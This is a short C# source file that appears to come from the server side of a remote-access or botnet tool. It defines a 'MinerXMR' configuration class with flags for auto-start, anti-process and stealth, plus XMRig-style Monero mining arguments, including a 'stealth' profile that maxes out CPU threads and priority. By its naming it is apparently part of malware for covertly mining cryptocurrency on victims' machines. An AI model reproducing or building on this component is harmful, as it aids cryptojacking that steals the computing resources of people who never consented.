namespace Server.Data;

internal class MinerXMR
{
	public bool AutoStart;

	public bool AntiProcess;

	public bool Stealth;

	public bool Gpu;

	public string Args = "--asm=auto --randomx-mode=auto --randomx-no-rdmsr --cpu-memory-pool=1 --cpu-max-threads-hint=100 --cuda-bfactor-hint=10 --cuda-bsleep-hint=100 --url=127.0.0.1:3335";

	public string ArgsStealh = "--asm=auto --randomx-mode=auto --randomx-no-rdmsr --cpu-memory-pool=1 --cpu-max-threads-hint=100 --cuda-bfactor-hint=10 --cuda-bsleep-hint=100 --cpu-priority=5 --cpu-no-yield --url=127.0.0.1:3335";
}
